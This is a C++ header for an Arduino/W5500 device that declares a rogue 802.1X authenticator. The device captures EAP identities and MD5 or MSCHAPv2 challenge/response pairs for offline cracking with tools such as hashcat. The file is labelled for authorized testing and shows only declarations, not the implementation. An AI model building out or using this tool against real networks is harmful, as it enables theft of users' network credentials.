#pragma once

#include <Arduino.h>
#include "w5500_raw.h"

// =============================================================================
// Rogue 802.1X Authenticator / EAP Credential Harvester (authorized testing only)
//
//   - rogueAuthStart : act as a fake 802.1X authenticator (sends EAP-Request/
//                      Identity and EAP-Request/MSCHAPv2 challenges) to capture
//                      client credentials for offline cracking
//
// Captures:
//   - Outer identity (often the real username)
//   - EAP-MD5 challenge/response pairs (directly crackable)
//   - MS-CHAPv2 challenge/response/peer-challenge (crackable with chapcrack,
//     hashcat mode 5500, or DES brute-force via CloudCracker)
//
// All frames are emitted at L2 over the W5500 in MACRAW mode (EtherType 0x888E).
// =============================================================================

struct HarvestedCred {
    uint8_t  peerMac[6];
    char     identity[64];
    uint8_t  method;          // EAP type that was answered (4=MD5, 26=MSCHAPv2)
    uint8_t  authChallenge[16];
    uint8_t  peerChallenge[16];
    uint8_t  peerResponse[24];
    uint8_t  md5Response[16]; // for EAP-MD5
    uint8_t  md5Challenge[16];
    uint8_t  md5ChalLen;
    bool     valid;
};

// Run a rogue authenticator for `seconds`. Sends EAP-Request/Identity to any
// EAPOL-Start seen (or periodically broadcasts), then challenges with EAP-MD5
// or EAP-MSCHAPv2. If `preferMschap` is true, challenges with MSCHAPv2 first
// (higher value for cracking). Returns the number of credentials harvested.
// Results are printed to Serial and stored in `creds` (up to maxCreds).
uint32_t rogueAuthStart(W5500Raw &eth, const uint8_t ourMac[6],
                        bool preferMschap = true,
                        uint32_t seconds = 60,
                        HarvestedCred *creds = nullptr,
                        uint8_t maxCreds = 8);
